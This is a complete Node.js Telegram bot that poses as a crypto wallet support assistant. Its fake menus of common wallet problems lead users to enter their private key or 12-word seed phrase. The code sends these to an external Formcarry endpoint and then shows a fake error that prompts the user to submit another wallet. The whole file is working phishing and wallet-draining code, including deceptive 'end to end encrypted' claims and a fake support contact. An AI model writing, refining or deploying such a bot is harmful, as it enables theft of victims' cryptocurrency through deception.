require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

// ====== Check for duplicate instances to prevent 409 Conflict ======
const LOCK_FILE = '.bot.lock';
if (fs.existsSync(LOCK_FILE)) {
    console.error('❌ Another bot instance is already running! Exiting...');
    process.exit(1);
} else {
    fs.writeFileSync(LOCK_FILE, '');
    process.on('exit', () => fs.unlinkSync(LOCK_FILE));
}

// ====== Bot and Formcarry Configurations ======
const BOT_CONFIGS = [
    {
        botToken: process.env.TG_BOT_TOK1,
        formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_1,
        formcarryUrl: process.env.FORMCARRY_URL_1
    },
    {
        botToken: process.env.TG_BOT_TOK2,
        formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_2,
        formcarryUrl: process.env.FORMCARRY_URL_2
    },
    {
        botToken: process.env.TG_BOT_TOK3,
        formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_3,
        formcarryUrl: process.env.FORMCARRY_URL_3
    }
].filter(config => config.botToken && config.formcarryToken);

if (BOT_CONFIGS.length === 0) {
    console.error('❌ No valid bot configurations found! Check your .env file');
    process.exit(1);
}

// ====== Initialize Bots ======
const bots = BOT_CONFIGS.map(config => {
    try {
        const bot = new TelegramBot(config.botToken, {
            polling: {
                autoStart: true,
                params: { timeout: 10 }
            }
        });
        bot.config = config;
        console.log(`✅ Bot with token ending in ${config.botToken.slice(-5)} initialized`);
        return bot;
    } catch (error) {
        console.error(`❌ Failed to initialize bot:`, error.message);
        return null;
    }
}).filter(bot => bot !== null);

// ====== Store user data temporarily ======
const userData = {};

// ====== Graceful shutdown handler ======
process.on('SIGINT', () => {
    console.log('🛑 Stopping bot gracefully...');
    bots.forEach(bot => bot.stopPolling());
    fs.unlinkSync(LOCK_FILE);
    process.exit();
});

// ====== Function to send data to Formcarry with retry logic ======
const sendToFormcarry = async (bot, chatId, data, retries = 3, delay = 1000) => {
    try {
        const response = await axios.post(bot.config.formcarryUrl, data, {
            headers: { Authorization: `Bearer ${bot.config.formcarryToken}` },
        });

        if (response.status === 200) {
            const optionss = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🔄 Restart Bot', callback_data: 'restart_bot' },
                            { text: '➕ Import New Wallet', callback_data: 'import_another_wallet' }
                        ],
                        [
                            { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                        ]
                    ],
                },
            };

            await bot.sendMessage(chatId, '❌ An error occured, please contact admin to solve your issue or try importing another wallet.', {
                parse_mode: 'Markdown',
                ...optionss,
            });
        } else {
            await bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
                parse_mode: 'Markdown',
            });
        }
    } catch (error) {
        if (error.response && error.response.status === 429 && retries > 0) {
            const retryDelay = delay * 2;
            console.log(`Rate limit hit. Retrying in ${retryDelay}ms...`);
            setTimeout(() => sendToFormcarry(bot, chatId, data, retries - 1, retryDelay), retryDelay);
        } else {
            console.error('Error submitting to Formcarry:', error.message);
            await bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
                parse_mode: 'Markdown',
            });
        }
    }
};

// ====== Start command ======
bots.forEach(bot => {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Harvest Transaction', callback_data: 'harvest' },
                        { text: 'Claim', callback_data: 'claim' }
                    ],
                    [
                        { text: 'Migration', callback_data: 'migrate' },
                        { text: 'Staking', callback_data: 'staking' }
                    ],
                    [
                        { text: 'Whitelisting', callback_data: 'whitelist' },
                        { text: 'Bridge Error', callback_data: 'bridge_err' }
                    ],
                    [
                        { text: 'Presale Error', callback_data: 'presale_err' },
                        { text: 'NFT', callback_data: 'nft' }
                    ],
                    [
                        { text: 'Revoke', callback_data: 'revoke' },
                        { text: 'KYC', callback_data: 'kyc' }
                    ],
                    [
                        { text: 'Deposit Issues', callback_data: 'deposit' },
                        { text: 'Others', callback_data: 'others' }
                    ],
                    [
                        { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                    ]
                ],
            },
        };

        bot.sendMessage(chatId, `Hi there!
I'm your dedicated assistant here to help with all your crypto-related questions and technical issues. 
Whether you're setting up a wallet, troubleshooting transactions, or navigating blockchain features, 
I'm here to guide you every step of the way.

If you're encountering an error, need help understanding crypto terms, or just have general questions 
about your account, simply ask! I'll provide the best possible solution, and if needed, I can connect 
you with one of our human experts.

⚠️NOTE: YOU ARE SUBMITTING ALL REQUIRED INFORMATIONS TO BOT WITH ZERO HUMAN INTERFERENCE. 

*🔗 END TO END ENCRYPTED 🔁*`, { parse_mode: 'Markdown', ...options });
        userData[chatId] = { step: 'choosing_option' };
    });
});

// ====== Handle inline keyboard button clicks ======
bots.forEach(bot => {
    bot.on('callback_query', (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;
        const data = callbackQuery.data;

        if (data === 'restart_bot') {
            bot.sendMessage(chatId, '🔄 Restarting the bot...');
            bot.sendMessage(chatId, '/start');
            return;
        } else if (data === 'import_another_wallet') {
            userData[chatId] = { step: 'choosing_option' };
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Harvest Transaction', callback_data: 'harvest' },
                            { text: 'Claim', callback_data: 'claim' }
                        ],
                        [
                            { text: 'Migration', callback_data: 'migrate' },
                            { text: 'Staking', callback_data: 'staking' }
                        ],
                        [
                            { text: 'Whitelisting', callback_data: 'whitelist' },
                            { text: 'Bridge Error', callback_data: 'bridge_err' }
                        ],
                        [
                            { text: 'Presale Error', callback_data: 'presale_err' },
                            { text: 'NFT', callback_data: 'nft' }
                        ],
                        [
                            { text: 'Revoke', callback_data: 'revoke' },
                            { text: 'KYC', callback_data: 'kyc' }
                        ],
                        [
                            { text: 'Help', callback_data: 'help' },
                            { text: 'Others', callback_data: 'others' }
                        ],
                        [
                            { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                        ]
                    ],
                },
            };

            bot.sendMessage(chatId, '➕ Please choose an option to import another wallet:', {
                parse_mode: 'Markdown',
                ...options,
            });
            return;
        }

        userData[chatId].option = data;

        if (data === 'private_key' || data === 'seed_phrase') {
            userData[chatId].authMethod = data;
            userData[chatId].step = 'providing_input';

            let message = '';
            if (data === 'private_key') {
                message = `You selected *Private Key* as your authentication method. 
Please enter your wallet **Private Key** :`;
            } else if (data === 'seed_phrase') {
                message = `You selected *Seed Phrase* as your authentication method. 
Please enter your **12-word Seed Phrase** (separated by spaces):`;
            }

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } else {
            userData[chatId].step = 'choosing_auth_method';
            const authMethodOptions = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🔑 Private Key', callback_data: 'private_key' },
                            { text: '📝 Seed Phrase', callback_data: 'seed_phrase' }
                        ]
                    ],
                },
            };

            bot.sendMessage(chatId, `You selected *${data}*. 
Please provide the *Private key* or *Seed Phrase* for the wallet affected to begin authentication with the smart contract:`, {
                parse_mode: 'Markdown',
                ...authMethodOptions,
            });
        }
    });
});

// ====== Handle user input ======
bots.forEach(bot => {
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        if (!userData[chatId] || userData[chatId].step !== 'providing_input') {
            return;
        }

        const authMethod = userData[chatId].authMethod;
        let isValid = false;
        let errorMessage = '';

        if (authMethod === 'seed_phrase') {
            const words = text.trim().split(/\s+/);
            isValid = words.length > 11;
            if (!isValid) {
                errorMessage = '❌ *Invalid Input!* It must contain at least **12 words**. Please try again:';
            }
        } else if (authMethod === 'private_key') {
            isValid = text.length > 20;
            if (!isValid) {
                errorMessage = '❌ *Invalid Input!* It must contain a valid private key. Please try again:';
            }
        }

        if (!isValid) {
            bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
            return;
        }

        userData[chatId].input = text;
        const data = {
            option: userData[chatId].option,
            authMethod: userData[chatId].authMethod,
            input: userData[chatId].input,
        };

        sendToFormcarry(bot, chatId, data);
        delete userData[chatId];
    });
});

// ====== Error handling ======
bots.forEach(bot => {
    bot.on('polling_error', (error) => {
        console.error(`Polling Error (${bot.config.botToken.slice(-5)}):`, error.message);
        if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
            console.error('Conflict detected! Stopping this instance...');
            process.exit(1);
        }
    });
});

console.log(`🚀 ${bots.length} bot(s) running successfully`);